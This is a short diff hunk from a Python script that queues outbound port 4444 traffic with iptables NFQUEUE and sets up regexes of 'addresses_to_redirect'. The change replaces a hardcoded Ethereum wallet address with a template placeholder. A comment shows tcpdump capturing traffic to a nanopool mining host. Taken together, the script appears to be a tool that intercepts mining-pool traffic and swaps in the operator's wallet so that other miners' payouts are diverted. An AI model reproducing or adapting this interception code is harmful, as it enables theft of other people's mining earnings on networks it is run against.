@@ -20,7 +20,7 @@ os.system('iptables -A OUTPUT -p tcp --dport 4444 -j NFQUEUE --queue-num 0')
 #os.system('iptables -A OUTPUT -p tcp --dport 5000 -j NFQUEUE --queue-num 0')
 #os.system('iptables -A INPUT -p tcp --dport 5000 -j NFQUEUE --queue-num 0')
 
-my_eth_address = '0x2C865C39A1DBa553bF4B19815b86E9d1cFDeA742'
+my_eth_address = '{{eth_wallet_address}}'
 
 addresses_to_redirect = [re.compile(re.escape(x.lower()), re.IGNORECASE) for x in [
   # tcpdump -i enp4s0 host eth-us-west1.nanopool.org -X > log_mining_activity.txt
